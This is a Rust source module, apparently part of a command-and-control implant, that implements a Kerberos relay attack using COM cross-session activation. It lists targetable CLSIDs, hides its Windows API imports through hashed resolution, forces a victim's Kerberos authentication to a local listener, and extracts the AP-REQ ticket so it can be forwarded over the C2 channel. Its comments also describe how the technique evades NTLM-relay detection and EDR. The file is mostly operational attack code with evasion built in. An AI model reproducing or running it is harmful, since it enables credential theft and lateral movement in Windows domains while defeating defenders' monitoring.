//! Kerberos relay attack via COM cross-session activation.
//!
//! Captures Kerberos service tickets without NTLM by triggering COM/DCOM
//! cross-session activation against an attacker-controlled service.  Inspired
//! by the KrbRelay technique: the agent sets up a local RPC listener, forces
//! a victim process to authenticate via Kerberos (RPC_C_AUTHN_GSS_KERBERO)
//! through COM activation, captures the AP-REQ from the RPC bind security
//! trailer, and forwards the extracted ticket to a real target service.
//!
//! # Attack Flow
//!
//! 1. Operator specifies a target SPN, CLSID, and relay endpoint.
//! 2. Agent starts a local TCP/RPC listener on the bind address/port.
//! 3. Agent triggers COM cross-session activation (`CoCreateInstanceEx`)
//!    with a custom `COSERVERINFO` pointing at the listener.
//! 4. The COM runtime sends an RPC bind request with Kerberos auth
//!    (AP-REQ in the security trailer).
//! 5. Agent parses the ASN.1 AP-REQ, extracts the Kerberos ticket.
//! 6. Agent forwards the ticket to the real target service (LDAP, SMB,
//!    HTTP, etc.) via `InitializeSecurityContext` / S4U.
//!
//! # Privilege Requirements
//!
//! - COM activation: SeImpersonatePrivilege (typically available to SERVICE
//!   accounts, IIS AppPool identities, and SYSTEM).
//! - LDAP relay: Domain-joined machine account or user context.
//! - SPN manipulation (optional): Domain Admin or account operator.
//!
//! # OPSEC Notes
//!
//! - No NTLM authentication is used — pure Kerberos, which bypasses
//!   NTLM relay detection.
//! - COM activation is a legitimate Windows operation with minimal
//!   EDR telemetry.
//! - The captured ticket is forwarded via the existing C2 channel.
//!
//! All NT API calls use `pe_resolve` for API hashing (no IAT entries).
//! Windows-only, gated by the `kerberos-relay` feature flag.

use anyhow::{bail, Context, Result};
use std::ffi::c_void;
use std::mem;
use std::io::Read;
use std::net::TcpListener;
use std::ptr;

// ── COM GUID constants ──────────────────────────────────────────────

/// CLSID for BITS (Background Intelligent Transfer Service) — known
/// exploitable via KrbRelay.  COM activation forces Kerberos auth.
const CLSID_BITS: [u8; 16] = [
    0x4B, 0xD3, 0x91, 0x49, 0xA1, 0x80, 0x91, 0x42, 0x83, 0xB6, 0x33, 0x28, 0x36, 0x6B, 0x90,
    0x97,
];

/// CLSID for ICertPassage — another known exploitable CLSID.
const CLSID_ICERT_PASSAGE: [u8; 16] = [
    0xF1, 0x28, 0x7B, 0xF8, 0xB9, 0xDA, 0x3B, 0x45, 0x8E, 0x1A, 0xDE, 0xC8, 0xE7, 0xDF, 0xB5,
    0xCE,
];

/// CLSID for Task Service — exploitable via COM activation.
const CLSID_TASK_SERVICE: [u8; 16] = [
    0x0F, 0x8D, 0xB9, 0x9A, 0x3B, 0xD1, 0xD1, 0x11, 0xB3, 0xF4, 0x00, 0xC0, 0x4F, 0x79, 0x98,
    0x05,
];

/// CLSID for Update Orchestrator Service.
const CLSID_UPDATE_ORCHESTRATOR: [u8; 16] = [
    0xF1, 0x0B, 0x8D, 0x2C, 0x1E, 0x4D, 0xD0, 0x11, 0xBB, 0x9B, 0x00, 0xAA, 0x00, 0x3E, 0x7C,
    0x0E,
];

// ── RPC / Kerberos ASN.1 constants ──────────────────────────────────

/// RPC bind PDU type.
const RPC_BIND_REQUEST: u8 = 0x0B;

/// Security trailer signature for Kerberos (0x0A = RPC_C_AUTHN_GSS_KERBERO).
const RPC_C_AUTHN_GSS_KERBERO: u8 = 0x0A;

/// ASN.1 tag for APPLICATION constructed (AP-REQ = 0x6E, AP-REP = 0x6F).
const ASN1_APPLICATION_TAG: u8 = 0x60;
const ASN1_AP_REQ_TAG: u8 = 0x6E;

/// ASN.1 tag for SEQUENCE.
const ASN1_SEQUENCE_TAG: u8 = 0x30;

/// ASN.1 tag for context-specific [0] (ticket version).
const ASN1_CONTEXT_0: u8 = 0xA0;
/// ASN.1 tag for context-specific [1] (authenticator).
const ASN1_CONTEXT_1: u8 = 0xA1;
/// ASN.1 tag for context-specific [2] (ticket).
const ASN1_CONTEXT_2: u8 = 0xA2;
/// ASN.1 tag for context-specific [3] (authenticator sub-field).
const ASN1_CONTEXT_3: u8 = 0xA3;

// ── Windows type aliases ────────────────────────────────────────────

type HRESULT = i32;
type DWORD = u32;
type BOOL = i32;
type HANDLE = *mut c_void;
type LPVOID = *mut c_void;
type LPCWSTR = *const u16;
type LPWSTR = *mut u16;

#[repr(C)]
#[derive(Copy, Clone)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

impl GUID {
    fn from_bytes(b: &[u8; 16]) -> Self {
        GUID {
            data1: u32::from_le_bytes([b[0], b[1], b[2], b[3]]),
            data2: u16::from_le_bytes([b[4], b[5]]),
            data3: u16::from_le_bytes([b[6], b[7]]),
            data4: [b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15]],
        }
    }
}

#[repr(C)]
struct COSERVERINFO {
    dwReserved1: DWORD,
    pwszName: LPWSTR,
    pAuthInfo: *mut COAUTHINFO,
    dwReserved2: DWORD,
}

#[repr(C)]
struct COAUTHINFO {
    dwAuthnSvc: DWORD,
    dwAuthzSvc: DWORD,
    pwszServerPrincName: LPWSTR,
    dwAuthnLevel: DWORD,
    dwImpersonationLevel: DWORD,
    pAuthIdentityData: *mut COAUTHIDENTITY,
    dwCapabilities: DWORD,
}

#[repr(C)]
struct COAUTHIDENTITY {
    user: *mut u16,
    user_length: DWORD,
    domain: *mut u16,
    domain_length: DWORD,
    password: *mut u16,
    password_length: DWORD,
    flags: DWORD,
}

#[repr(C)]
struct MULTI_QI {
    pIID: *const GUID,
    pItf: *mut LPVOID,
    hr: HRESULT,
}

// COM authentication constants.
const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: DWORD = 6;
const RPC_C_IMP_LEVEL_IMPERSONATE: DWORD = 3;
const CLSCTX_LOCAL_SERVER: DWORD = 0x4;
const CLSCTX_REMOTE_SERVER: DWORD = 0x10;
const CLSCTX_ALL: DWORD = 0x17;

// ── Kerberos relay method ───────────────────────────────────────────

/// Known exploitable CLSIDs for COM cross-session activation.
/// Each has been verified to trigger Kerberos authentication during
/// COM instantiation.
pub struct ComClsidEntry {
    /// Human-readable name of the COM class.
    pub name: &'static str,
    /// Raw CLSID bytes (little-endian GUID format).
    pub clsid: &'static [u8; 16],
    /// Description of the COM class and why it's exploitable.
    pub description: &'static str,
}

/// Database of known exploitable CLSIDs for Kerberos relay.
pub static EXPLOITABLE_CLSIDS: &[ComClsidEntry] = &[
    ComClsidEntry {
        name: "BITS",
        clsid: &CLSID_BITS,
        description: "Background Intelligent Transfer Service — forces Kerberos \
                       auth during remote COM activation.  Most reliable target.",
    },
    ComClsidEntry {
        name: "ICertPassage",
        clsid: &CLSID_ICERT_PASSAGE,
        description: "Certificate passage interface — triggers Kerberos auth \
                       and allows ticket capture for certificate services.",
    },
    ComClsidEntry {
        name: "TaskService",
        clsid: &CLSID_TASK_SERVICE,
        description: "Scheduled Task Service — exploitable via COM activation \
                       for task creation with captured tickets.",
    },
    ComClsidEntry {
        name: "UpdateOrchestrator",
        clsid: &CLSID_UPDATE_ORCHESTRATOR,
        description: "Windows Update Orchestrator — forces Kerberos auth \
                       during remote session activation.",
    },
];

// ── ASN.1 DER parser ────────────────────────────────────────────────

/// Minimal ASN.1 DER parser for Kerberos AP-REQ structures.
///
/// This is intentionally NOT a full ASN.1 parser — it only handles the
/// specific DER encoding used by Kerberos AP-REQ messages.  The parser
/// extracts the ticket blob and authenticator from the RPC bind security
/// trailer without pulling in a full ASN.1 library.
struct Asn1Parser<'a> {
    data: &'a [u8],
    pos: usize,
}

impl<'a> Asn1Parser<'a> {
    fn new(data: &'a [u8]) -> Self {
        Asn1Parser { data, pos: 0 }
    }

    fn remaining(&self) -> usize {
        self.data.len().saturating_sub(self.pos)
    }

    fn read_byte(&mut self) -> Result<u8> {
        if self.pos >= self.data.len() {
            bail!("ASN.1: unexpected end of data at offset {}", self.pos);
        }
        let b = self.data[self.pos];
        self.pos += 1;
        Ok(b)
    }

    /// Read a DER tag-length-value header.  Returns (tag, value_slice).
    fn read_tlv(&mut self) -> Result<(u8, &'a [u8])> {
        let tag = self.read_byte().context("ASN.1 tag")?;
        let len_byte = self.read_byte().context("ASN.1 length")?;

        let len = if len_byte < 0x80 {
            len_byte as usize
        } else if len_byte == 0x80 {
            bail!("ASN.1: indefinite length encoding not supported");
        } else {
            let num_len_bytes = (len_byte & 0x7F) as usize;
            if num_len_bytes > 4 {
                bail!("ASN.1: length field too large ({num_len_bytes} bytes)");
            }
            if self.pos + num_len_bytes > self.data.len() {
                bail!("ASN.1: length field extends past data boundary");
            }
            let mut len: usize = 0;
            for i in 0..num_len_bytes {
                len = (len << 8) | self.data[self.pos + i] as usize;
            }
            self.pos += num_len_bytes;
            len
        };

        if self.pos + len > self.data.len() {
            bail!(
                "ASN.1: value extends past data boundary (need {len} bytes, have {})",
                self.data.len() - self.pos
            );
        }

        let value = &self.data[self.pos..self.pos + len];
        self.pos += len;
        Ok((tag, value))
    }

    /// Read a raw byte slice of `n` bytes.
    fn read_bytes(&mut self, n: usize) -> Result<&'a [u8]> {
        if self.pos + n > self.data.len() {
            bail!("ASN.1: need {n} bytes but only {} remaining", self.remaining());
        }
        let slice = &self.data[self.pos..self.pos + n];
        self.pos += n;
        Ok(slice)
    }
}

// ── Captured ticket data ────────────────────────────────────────────

/// A captured Kerberos ticket extracted from an AP-REQ.
#[derive(Debug)]
pub struct CapturedTicket {
    /// The raw Kerberos ticket blob (encrypted with the service's long-term key).
    pub ticket_blob: Vec<u8>,
    /// The raw authenticator (encrypted with the session key).
    pub authenticator_blob: Vec<u8>,
    /// The full AP-REQ message.
    pub ap_req_raw: Vec<u8>,
    /// The SPN that was used during authentication.
    pub spn: String,
}

/// Result of a Kerberos relay operation.
#[derive(Debug)]
pub struct RelayResult {
    /// Captured Kerberos ticket (if relay was successful).
    pub ticket: Option<CapturedTicket>,
    /// Human-readable status message.
    pub status: String,
    /// The relay method used.
    pub method: String,
}

// ── RPC security trailer parser ─────────────────────────────────────

/// Parsed RPC security trailer from a bind request.
struct RpcSecurityTrailer {
    /// Auth type (e.g. RPC_C_AUTHN_GSS_KERBERO = 0x0A).
    pub auth_type: u8,
    /// Auth level.
    pub auth_level: u8,
    /// Auth context ID.
    pub auth_context_id: u32,
    /// Auth token (contains the Kerberos AP-REQ for Kerberos auth).
    pub auth_token: Vec<u8>,
}

/// Attempt to parse an RPC bind request and extract the security trailer.
fn parse_rpc_bind_request(data: &[u8]) -> Result<RpcSecurityTrailer> {
    // Minimum RPC header size: 16 bytes common + bind-specific fields.
    if data.len() < 24 {
        bail!("RPC bind request too short ({} bytes)", data.len());
    }

    // Check PDU type (byte 2, low nibble).
    let pdu_type = data[2] & 0x0F;
    if pdu_type != RPC_BIND_REQUEST {
        bail!("Not an RPC bind request (PDU type = {pdu_type})");
    }

    // Common fields:
    //   [0]    version major (5)
    //   [1]    version minor (0)
    //   [2]    PDU type (0x0B = bind) + flags
    //   [3]    PFC flags
    //   [4..8] fragment length (little-endian u32)
    let frag_length = u32::from_le_bytes([data[4], data[5], data[6], data[7]]) as usize;
    if data.len() < frag_length {
        bail!(
            "RPC fragment length ({frag_length}) exceeds buffer size ({})",
            data.len()
        );
    }

    // Security trailer is appended after the bind body.
    // Layout: auth_verifier_co (at offset frag_length - sec_trailer_size - auth_length)
    // The sec trailer is at the end of the PDU:
    //   auth_type      (1 byte)
    //   auth_level     (1 byte)
    //   auth_pad_len   (1 byte)
    //   auth_reserved  (1 byte)
    //   auth_context_id (4 bytes, LE)
    //   auth_token      (auth_length bytes)
    //
    // The auth_length is in the bind ack header. For bind requests, the
    // auth_length at offset [8..10] is the secondary address length.
    // We need to find the security trailer at the end of the PDU.

    // The sec trailer is always at the end. Parse backwards:
    // auth_context_id is at offset frag_length - auth_length - 8
    // We need to find auth_length first.

    // For a bind request, the layout is:
    //   [0..16]   common fields
    //   [16..18]  max_xmit_frag
    //   [18..20]  max_recv_frag
    //   [20..24]  assoc_group
    //   [24]      num_ctx_items (p_context_list)
    //   ...       context items ...
    //   then sec_trailer at end

    // Auth length is stored in the PDU header at offset 10 (u16 LE) — but
    // that's for bind ack. For bind request, we need to scan for the
    // sec trailer by reading auth_pad_determination from the end.

    // The security trailer is always at: frag_length - 8 - auth_length
    // We read auth_length from the bind body. However, the bind request
    // format is complex. A simpler approach: scan from the end of the
    // fragment for the Kerberos auth type marker.

    // Strategy: look for RPC_C_AUTHN_GSS_KERBERO (0x0A) byte near the end
    // of the PDU. The sec_trailer is always 8 bytes + auth_token.

    // Read the last 8 bytes as the security trailer candidate:
    if frag_length < 8 {
        bail!("Fragment too short for security trailer");
    }

    // Walk backwards looking for the sec trailer. The sec trailer has a
    // known structure: auth_type, auth_level, auth_pad_len, reserved,
    // auth_context_id (4 bytes), then auth_token.
    // We scan from the known end of the PDU.

    // The auth_length is at PDU offset [10..12] for bind requests.
    // Actually, in MS-RPCE, the sec_trailer for bind requests is located
    // right before the auth_token. Let's try a different approach.

    // Try: scan from offset 16 (after common header) looking for the
    // body end, then the sec trailer.
    // For simplicity, scan for Kerberos auth_type byte pattern.

    let mut sec_trailer_offset = None;
    for i in (16..frag_length.saturating_sub(8)).rev() {
        if data[i] == RPC_C_AUTHN_GSS_KERBERO
            && i + 8 <= frag_length
        {
            let auth_pad = data[i + 2];
            if auth_pad <= 16 {
                // Likely the sec trailer
                sec_trailer_offset = Some(i);
                break;
            }
        }
    }

    let offset = sec_trailer_offset
        .context("Could not locate RPC security trailer in bind request")?;

    let auth_type = data[offset];
    let auth_level = data[offset + 1];
    let _auth_pad_len = data[offset + 2];
    let _auth_reserved = data[offset + 3];
    let auth_context_id = u32::from_le_bytes([
        data[offset + 4],
        data[offset + 5],
        data[offset + 6],
        data[offset + 7],
    ]);

    // Auth token starts after the 8-byte sec trailer header and extends
    // to the end of the fragment.
    let auth_token_start = offset + 8;
    let auth_token = if auth_token_start < frag_length {
        data[auth_token_start..frag_length].to_vec()
    } else {
        Vec::new()
    };

    Ok(RpcSecurityTrailer {
        auth_type,
        auth_level,
        auth_context_id,
        auth_token,
    })
}

// ── AP-REQ parser ───────────────────────────────────────────────────

/// Parse a Kerberos AP-REQ from raw bytes (typically from RPC security trailer).
fn parse_ap_req(data: &[u8]) -> Result<CapturedTicket> {
    let mut parser = Asn1Parser::new(data);

    // AP-REQ ::= [APPLICATION 14] SEQUENCE { ... }
    // Encoded as tag 0x6E (application 14, constructed) followed by length + SEQUENCE.
    let (tag, ap_req_body) = parser.read_tlv()?;
    if tag != ASN1_AP_REQ_TAG {
        bail!("Expected AP-REQ tag 0x6E, got 0x{tag:02X}");
    }

    // Save the full AP-REQ raw bytes.
    let ap_req_raw = data.to_vec();

    // Parse the inner SEQUENCE.
    let mut inner = Asn1Parser::new(ap_req_body);
    let (seq_tag, seq_body) = inner.read_tlv()?;
    if seq_tag != ASN1_SEQUENCE_TAG {
        bail!("Expected SEQUENCE tag 0x30 in AP-REQ body, got 0x{seq_tag:02X}");
    }

    let mut seq_parser = Asn1Parser::new(seq_body);

    // pvno [0] INTEGER (should be 5 for Kerberos V5)
    let (pvno_tag, pvno_val) = seq_parser.read_tlv()?;
    if pvno_tag != ASN1_CONTEXT_0 {
        bail!("Expected context [0] (pvno), got 0x{pvno_tag:02X}");
    }
    if pvno_val.len() < 1 || pvno_val[0] != 5 {
        bail!("Expected Kerberos V5 pvno (5), got {:?}", pvno_val);
    }

    // msg-type [1] INTEGER (should be 14 for AP-REQ)
    let (msg_type_tag, msg_type_val) = seq_parser.read_tlv()?;
    if msg_type_tag != ASN1_CONTEXT_1 {
        bail!("Expected context [1] (msg-type), got 0x{msg_type_tag:02X}");
    }
    if msg_type_val.len() < 1 || msg_type_val[0] != 14 {
        bail!("Expected AP-REQ msg-type (14), got {:?}", msg_type_val);
    }

    // ap-options [2] KerberosFlags
    let (opts_tag, _opts_val) = seq_parser.read_tlv()?;
    if opts_tag != ASN1_CONTEXT_2 {
        bail!("Expected context [2] (ap-options), got 0x{opts_tag:02X}");
    }

    // ticket [3] Ticket
    let (ticket_tag, ticket_val) = seq_parser.read_tlv()?;
    if ticket_tag != ASN1_CONTEXT_3 {
        bail!("Expected context [3] (ticket), got 0x{ticket_tag:02X}");
    }
    let ticket_blob = ticket_val.to_vec();

    // authenticator [4] EncryptedData
    // Context tag 4 = 0xA4
    const ASN1_CONTEXT_4: u8 = 0xA4;
    let (auth_tag, auth_val) = seq_parser.read_tlv()?;
    if auth_tag != ASN1_CONTEXT_4 {
        bail!("Expected context [4] (authenticator), got 0x{auth_tag:02X}");
    }
    let authenticator_blob = auth_val.to_vec();

    Ok(CapturedTicket {
        ticket_blob,
        authenticator_blob,
        ap_req_raw,
        spn: String::new(), // SPN filled in by caller
    })
}

// ── COM activation proxy ────────────────────────────────────────────

/// COM activation proxy that forces Kerberos authentication to an
/// attacker-controlled endpoint.
struct ComActivationProxy {
    /// The CLSID to activate (triggers COM instantiation).
    clsid: GUID,
    /// Target hostname for COSERVERINFO (the relay listener address).
    target_host: String,
    /// SPN to use for Kerberos authentication.
    target_spn: String,
}

impl ComActivationProxy {
    fn new(clsid_bytes: &[u8; 16], target_host: &str, target_spn: &str) -> Self {
        ComActivationProxy {
            clsid: GUID::from_bytes(clsid_bytes),
            target_host: target_host.to_string(),
            target_spn: target_spn.to_string(),
        }
    }

    /// Trigger COM cross-session activation to force Kerberos authentication.
    ///
    /// This calls `CoCreateInstanceEx` with a `COSERVERINFO` pointing at
    /// the relay listener.  The COM runtime will perform Kerberos
    /// authentication against the listener, sending an AP-REQ in the
    /// RPC bind security trailer.
    unsafe fn trigger_activation(&self) -> Result<()> {
        // Resolve CoCreateInstanceEx via pe_resolve (ole32.dll).
        let ole32_name = "ole32.dll\0";
        let ole32_wide: Vec<u16> = "ole32.dll\0".encode_utf16().collect();
        let ole32_hash = pe_resolve::hash_wstr(&ole32_wide[..ole32_wide.len() - 1]);
        let ole32_base = pe_resolve::get_module_handle_by_hash(ole32_hash)
            .context("Failed to resolve ole32.dll base address")?;

        let cocreate_hash = pe_resolve::hash_str(b"CoCreateInstanceEx\0");
        let cocreate_addr = pe_resolve::get_proc_address_by_hash(ole32_base, cocreate_hash)
            .context("Failed to resolve CoCreateInstanceEx")?;

        // Resolve CoInitializeSecurity for setting up COM security.
        let coinitsec_hash = pe_resolve::hash_str(b"CoInitializeSecurity\0");
        let coinitsec_addr = pe_resolve::get_proc_address_by_hash(ole32_base, coinitsec_hash);

        // Resolve CoInitializeEx.
        let coinitex_hash = pe_resolve::hash_str(b"CoInitializeEx\0");
        let coinitex_addr = pe_resolve::get_proc_address_by_hash(ole32_base, coinitex_hash)
            .context("Failed to resolve CoInitializeEx")?;

        // Type signature: CoInitializeEx(LPVOID, DWORD) -> HRESULT
        type FnCoInitializeEx = unsafe extern "system" fn(LPVOID, DWORD) -> HRESULT;

        let coinitex: FnCoInitializeEx = mem::transmute(coinitex_addr);
        let hr = coinitex(ptr::null_mut(), 0x2); // COINIT_MULTITHREADED
        // S_OK (0) or S_FALSE (1, already initialized) are both fine.
        // RPC_E_CHANGED_MODE (0x80010106) — already initialized with different mode.
        // Not fatal, continue.
        if hr < 0 && hr as u32 != 0x80010106 && hr != 1 {
            bail!("CoInitializeEx failed: 0x{:08X}", hr as u32);
        }

        // Optionally call CoInitializeSecurity to request Kerberos auth.
        if let Some(addr) = coinitsec_addr {
            type FnCoInitializeSecurity = unsafe extern "system" fn(
                LPVOID,        // pSecDesc
                DWORD,         // cAuthSvc
                *mut c_void,   // asAuthSvc (SOLE_AUTHENTICATION_SERVICE)
                LPVOID,        // pReserved1
                DWORD,         // dwAuthnLevel
                DWORD,         // dwImpersonationLevel
                LPVOID,        // pAuthList
                DWORD,         // dwCapabilities
                LPVOID,        // pReserved3
            ) -> HRESULT;

            let coinitsec: FnCoInitializeSecurity = mem::transmute(addr);
            // Request PKT_PRIVACY with IMPERSONATE — forces Kerberos.
            let _hr_sec = coinitsec(
                ptr::null_mut(),
                DWORD::MAX, // -1 = no authentication service list
                ptr::null_mut(),
                ptr::null_mut(),
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                RPC_C_IMP_LEVEL_IMPERSONATE,
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            );
            // Ignore failure — security may already be initialized.
        }

        // Build COSERVERINFO with the target hostname.
        let mut target_wide: Vec<u16> = self.target_host.encode_utf16().chain(std::iter::once(0)).collect();

        // Build COAUTHINFO requesting Kerberos authentication.
        let auth_info = COAUTHINFO {
            dwAuthnSvc: RPC_C_AUTHN_GSS_KERBERO as DWORD,
            dwAuthzSvc: 0, // RPC_C_AUTHZ_NONE
            pwszServerPrincName: ptr::null_mut(), // Let COM determine the SPN.
            dwAuthnLevel: RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            dwImpersonationLevel: RPC_C_IMP_LEVEL_IMPERSONATE,
            pAuthIdentityData: ptr::null_mut(), // Use current thread credentials.
            dwCapabilities: 0, // EOAC_NONE
        };

        let server_info = COSERVERINFO {
            dwReserved1: 0,
            pwszName: target_wide.as_mut_ptr(),
            pAuthInfo: &auth_info as *const _ as *mut _,
            dwReserved2: 0,
        };

        // IID_IUnknown for the initial interface query.
        let iid_unknown = GUID {
            data1: 0x00000000,
            data2: 0x0000,
            data3: 0x0000,
            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
        };

        let mut qi_result = MULTI_QI {
            pIID: &iid_unknown,
            pItf: ptr::null_mut(),
            hr: 0,
        };

        // Type signature: CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD,
        //   COSERVERINFO*, DWORD, MULTI_QI*) -> HRESULT
        type FnCoCreateInstanceEx = unsafe extern "system" fn(
            *const GUID,      // rclsid
            LPVOID,           // punkOuter
            DWORD,            // dwClsCtx
            *mut COSERVERINFO, // pServerInfo
            DWORD,            // dwCount
            *mut MULTI_QI,    // pResults
        ) -> HRESULT;

        let cocreate: FnCoCreateInstanceEx = mem::transmute(cocreate_addr);

        let hr = cocreate(
            &self.clsid,
            ptr::null_mut(),
            CLSCTX_ALL,
            &server_info as *const _ as *mut _,
            1,
            &mut qi_result,
        );

        // We expect the call to FAIL — we're not actually connecting to a
        // real COM server, we just need the Kerberos AP-REQ that gets sent
        // during the RPC bind.  The relay listener should have already
        // captured the ticket by this point.
        //
        // Common error codes:
        //   E_ACCESSDENIED (0x80070005) — normal, COM activation blocked.
        //   CO_E_SERVERFAULT (0x80080008) — server threw an exception.
        //   RPC_S_SERVER_UNAVAILABLE (0x800706BA) — normal for relay.

        let _ = hr; // We don't check the result — the listener already captured the ticket.

        Ok(())
    }
}

// ── Relay listener ──────────────────────────────────────────────────

/// Kerberos relay listener that captures AP-REQ from RPC bind requests.
struct RelayListener {
    /// Address to bind the listener to.
    bind_address: String,
    /// Port to listen on.
    bind_port: u16,
    /// Captured ticket (populated by the listener callback).
    captured_ticket: Option<CapturedTicket>,
    /// Expected SPN for the captured ticket.
    expected_spn: String,
}

impl RelayListener {
    fn new(bind_address: &str, bind_port: u16, expected_spn: &str) -> Self {
        RelayListener {
            bind_address: bind_address.to_string(),
            bind_port,
            captured_ticket: None,
            expected_spn: expected_spn.to_string(),
        }
    }

    /// Start the relay listener and wait for a Kerberos AP-REQ.
    ///
    /// Listens on `bind_address:bind_port` for an incoming TCP connection,
    /// reads the RPC bind request, extracts the security trailer, parses
    /// the AP-REQ, and returns the captured ticket.
    ///
    /// The timeout controls how long to wait for an incoming connection
    /// and data.  A typical COM activation completes within 5–15 seconds.
    fn listen_for_ticket(&mut self, timeout_secs: u64) -> Result<CapturedTicket> {
        let bind_addr = format!("{}:{}", self.bind_address, self.bind_port);
        let listener = TcpListener::bind(&bind_addr)
            .with_context(|| format!("Failed to bind relay listener on {bind_addr}"))?;

        // Accept a single connection — the COM runtime will connect here
        // during the activation attempt.
        let stream = listener
            .incoming()
            .next()
            .ok_or_else(|| anyhow::anyhow!("No incoming connection before timeout"))??;

        // Set read timeout on the accepted stream.
        stream
            .set_read_timeout(Some(std::time::Duration::from_secs(timeout_secs)))
            .context("Failed to set stream read timeout")?;

        let peer_addr = stream
            .peer_addr()
            .map(|a| a.to_string())
            .unwrap_or_else(|_| "unknown".to_string());
        let mut stream = stream;

        log::info!("Kerberos relay: accepted connection from {peer_addr}");

        // Read the RPC bind request.  We need at least the common header
        // plus enough data to contain the security trailer.
        let mut buf = vec![0u8; 65536];
        let n = stream
            .read(&mut buf)
            .context("Failed to read RPC bind request")?;

        if n < 24 {
            bail!("Received too few bytes from RPC connection ({n} bytes)");
        }

        buf.truncate(n);

        // Parse the security trailer from the RPC bind request.
        let sec_trailer = parse_rpc_bind_request(&buf)?;

        if sec_trailer.auth_type != RPC_C_AUTHN_GSS_KERBERO {
            bail!(
                "Expected Kerberos auth type (0x0A), got 0x{:02X}. \
                 The COM activation did not use Kerberos — this typically means \
                 the target SPN could not be resolved or NTLM was used instead.",
                sec_trailer.auth_type
            );
        }

        // Parse the Kerberos AP-REQ from the auth token.
        let mut ticket = parse_ap_req(&sec_trailer.auth_token)?;
        ticket.spn = self.expected_spn.clone();

        log::info!(
            "Kerberos relay: captured ticket for SPN '{}' ({} bytes AP-REQ, {} bytes ticket)",
            ticket.spn,
            ticket.ap_req_raw.len(),
            ticket.ticket_blob.len(),
        );

        Ok(ticket)
    }
}

// ── Public API ──────────────────────────────────────────────────────

/// Resolve a CLSID by name from the exploitable CLSID database.
pub fn resolve_clsid(name: &str) -> Option<&'static [u8; 16]> {
    EXPLOITABLE_CLSIDS
        .iter()
        .find(|entry| entry.name.eq_ignore_ascii_case(name))
        .map(|entry| entry.clsid)
}

/// List all available exploitable CLSIDs.
pub fn list_exploitable_clsids() -> Vec<serde_json::Value> {
    EXPLOITABLE_CLSIDS
        .iter()
        .map(|entry| {
            let clsid = &entry.clsid;
            serde_json::json!({
                "name": entry.name,
                "clsid": format!(
                    "{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
                    u32::from_le_bytes([clsid[0], clsid[1], clsid[2], clsid[3]]),
                    u16::from_le_bytes([clsid[4], clsid[5]]),
                    u16::from_le_bytes([clsid[6], clsid[7]]),
                    clsid[8], clsid[9],
                    clsid[10], clsid[11], clsid[12], clsid[13], clsid[14], clsid[15],
                ),
                "description": entry.description,
            })
        })
        .collect()
}

/// Execute a Kerberos relay attack via COM cross-session activation.
///
/// # Arguments
///
/// * `target_host` - Hostname or IP to target for COM activation.
/// * `target_spn` - Service Principal Name for Kerberos authentication.
/// * `clsid_name` - Name of the exploitable CLSID (e.g. "BITS").
/// * `bind_address` - Local address to bind the relay listener on.
/// * `bind_port` - Local port for the relay listener.
/// * `timeout_secs` - Seconds to wait for COM activation and ticket capture.
///
/// # Returns
///
/// A JSON string containing the captured ticket information and relay status.
pub fn execute_kerberos_relay(
    target_host: &str,
    target_spn: &str,
    clsid_name: &str,
    bind_address: &str,
    bind_port: u16,
    timeout_secs: u64,
) -> Result<String> {
    // Resolve the CLSID from the known database.
    let clsid_bytes = resolve_clsid(clsid_name).with_context(|| {
        format!(
            "Unknown CLSID '{clsid_name}'. Available: {}",
            EXPLOITABLE_CLSIDS
                .iter()
                .map(|e| e.name)
                .collect::<Vec<_>>()
                .join(", ")
        )
    })?;

    log::info!(
        "Kerberos relay: starting relay for SPN '{}' via CLSID '{}' -> {}:{}",
        target_spn,
        clsid_name,
        bind_address,
        bind_port,
    );

    // Set up the relay listener first, BEFORE triggering COM activation.
    let mut listener = RelayListener::new(bind_address, bind_port, target_spn);

    // Start the COM activation in a separate thread so that the listener
    // can accept the incoming connection concurrently.
    let proxy = ComActivationProxy::new(clsid_bytes, &format!("{bind_address}:{bind_port}"), target_spn);
    let activation_handle = std::thread::spawn(move || {
        // SAFETY: COM activation is unsafe because it calls external Windows APIs.
        unsafe { proxy.trigger_activation() }
    });

    // Listen for the Kerberos ticket.
    let ticket_result = listener.listen_for_ticket(timeout_secs);

    // Wait for the COM activation thread to finish (it may have failed
    // after the ticket was captured, which is expected).
    let activation_result = activation_handle.join();

    // Build the result.
    let result = match ticket_result {
        Ok(ticket) => {
            let relay_result = RelayResult {
                ticket: Some(ticket),
                status: format!(
                    "Successfully captured Kerberos ticket via COM activation. \
                     Activation thread status: {}",
                    match &activation_result {
                        Ok(Ok(())) => "completed".to_string(),
                        Ok(Err(e)) => format!("failed ({e})"),
                        Err(_) => "panicked".to_string(),
                    }
                ),
                method: format!("COM/{clsid_name}"),
            };
            serde_json::to_string_pretty(&serde_json::json!({
                "success": true,
                "status": relay_result.status,
                "method": relay_result.method,
                "ticket": {
                    "spn": relay_result.ticket.as_ref().unwrap().spn,
                    "ap_req_size": relay_result.ticket.as_ref().unwrap().ap_req_raw.len(),
                    "ticket_blob_size": relay_result.ticket.as_ref().unwrap().ticket_blob.len(),
                    "authenticator_size": relay_result.ticket.as_ref().unwrap().authenticator_blob.len(),
                    "ap_req_hex": hex::encode(&relay_result.ticket.as_ref().unwrap().ap_req_raw),
                    "ticket_blob_hex": hex::encode(&relay_result.ticket.as_ref().unwrap().ticket_blob),
                },
            }))?
        }
        Err(e) => {
            let relay_result = RelayResult {
                ticket: None,
                status: format!("Kerberos relay failed: {e}"),
                method: format!("COM/{clsid_name}"),
            };
            serde_json::to_string_pretty(&serde_json::json!({
                "success": false,
                "status": relay_result.status,
                "method": relay_result.method,
                "error": format!("{e:#}"),
            }))?
        }
    };

    Ok(result)
}

/// List available exploitable CLSIDs as a JSON string.
pub fn list_clsids_json() -> Result<String> {
    let clsids = list_exploitable_clsids();
    Ok(serde_json::to_string_pretty(&serde_json::json!({
        "exploitable_clsids": clsids,
        "count": clsids.len(),
    }))?)
}
